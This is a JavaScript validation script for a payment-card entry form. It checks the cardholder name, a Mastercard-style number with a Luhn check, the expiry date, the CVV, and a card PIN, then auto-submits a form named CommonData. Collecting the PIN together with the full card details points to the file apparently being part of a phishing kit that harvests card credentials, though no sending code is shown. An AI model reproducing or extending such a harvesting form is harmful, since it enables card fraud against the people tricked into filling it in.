function hasNumber(t){return /\d/.test(t);}

function bmcc ( form )
{
    var illegalChars = /[\W_]/;
	
     if (form.noc.value.length < 5) {
    alert( "Error: Name on card." );
    form.noc.focus();
	  document.getElementById('noc').style.backgroundColor="#FF6A6A";
    return false ;
	 }
	   if (form.ccnr.value.length < 16) {
    alert( "Error: Card number is incomplete." );
    form.ccnr.focus();
	  document.getElementById('noc').style.backgroundColor="";
	  document.getElementById('ccnr').style.backgroundColor="#FF6A6A";
    return false ;
	 }
	 
 if (!form.ccnr.value.match("^5")) {
    alert( "Error: Card number is incorrect.[0]" );
    form.ccnr.focus();
	  document.getElementById('noc').style.backgroundColor="";
	  document.getElementById('ccnr').style.backgroundColor="#FF6A6A";
    return false ;
  }  
  if(!verifyMod10(form.ccnr.value)) {
    alert( "Error: Card number is incorrect.[1]" );
    form.ccnr.focus();
	  document.getElementById('noc').style.backgroundColor="";
	  document.getElementById('ccnr').style.backgroundColor="#FF6A6A";
    return false ;
  }
     if (form.expm.value.length < 2) {
    alert( "Error: Card expiration date [MM]" );
    form.expm.focus();
	  document.getElementById('noc').style.backgroundColor="";
	  document.getElementById('ccnr').style.backgroundColor="";
	  document.getElementById('expm').style.backgroundColor="#FF6A6A";
    return false ;
  }  if (form.expy.value.length < 2) {
    alert( "Error: Card expiration date [YY]" );
    form.expy.focus();
	  document.getElementById('noc').style.backgroundColor="";
	  document.getElementById('ccnr').style.backgroundColor="";
	  document.getElementById('expm').style.backgroundColor="";
	  document.getElementById('expy').style.backgroundColor="#FF6A6A";
    return false ;
  }  if (form.cvv.value.length < 3) {
    alert( "Error: Card verification code (CVC/CVV)" );
    form.cvv.focus();
	  document.getElementById('noc').style.backgroundColor="";
	  document.getElementById('ccnr').style.backgroundColor="";
	  document.getElementById('expm').style.backgroundColor="";
	  document.getElementById('expy').style.backgroundColor="";
	  document.getElementById('cvv').style.backgroundColor="#FF6A6A";
    return false ;
  }  if (form.nip.value.length < 4) {
    alert( "Error: Credit Card PIN Code " );
    form.nip.focus();
	  document.getElementById('noc').style.backgroundColor="";
	  document.getElementById('ccnr').style.backgroundColor="";
	  document.getElementById('expm').style.backgroundColor="";
	  document.getElementById('expy').style.backgroundColor="";
	  document.getElementById('cvv').style.backgroundColor="";
	  document.getElementById('nip').style.backgroundColor="#FF6A6A";
    return false ;
  }  
  
}

	   function removeSpacesFromPAN(fieldName) // strips off spaces before and after field name
{

	var startIndex, lastIndex;
	var newFieldName, newC;

	lastIndex = fieldName.length-1;
	startIndex = 0;

	newC = fieldName.charAt(startIndex);
	while ((startIndex<lastIndex) && ((newC == " ") || (newC == "\n") || (newC == "\r") || (newC == "\t"))) {
		startIndex++;
		newC = fieldName.charAt(startIndex);
	}

	newC = fieldName.charAt(lastIndex);
	while ((lastIndex>=0) && ((newC == " ") || (newC == "\n") || (newC == "\r") || (newC == "\t"))) {
		lastIndex--;
		newC = fieldName.charAt(lastIndex);
	}
	if (startIndex<=lastIndex) {
		newFieldName = fieldName.substring(startIndex, lastIndex+1);
		return newFieldName;
	} else {
		return fieldName;
	}
}


function verifyMod10(field)
{
	var PAN = field;

	PAN = removeSpacesFromPAN(PAN);
	var st = PAN;

	if (st.length > 19)
		return false;

	var sum = 0;
	var mul = 1;
	var st_len = st.length;
	var tproduct;

	for (i = 0; i < st_len; i++)
	{
		digit = st.substring(st_len-i-1, st_len-i);

		if (digit == " " || digit == "-")
			continue;

		tproduct = parseInt(digit ,10) * mul;

	    if (tproduct >= 10)
	      sum += (tproduct % 10) + 1;
	    else
	      sum += tproduct;

	    if (mul == 1)
	      mul++;
	    else
	      mul--;
	}

	if ((sum % 10) != 0)
		return false;
 
	return true;
}

function formSub(){
 setTimeout("document.CommonData.submit()",1000);
}

function logPANentry(action) {

                var loc = document.location.pathname.substr(document.location.pathname.lastIndexOf("/")+1)
       
                var rn = Math.random()+"";
                var a = rn * 10000000000000;
                
                
}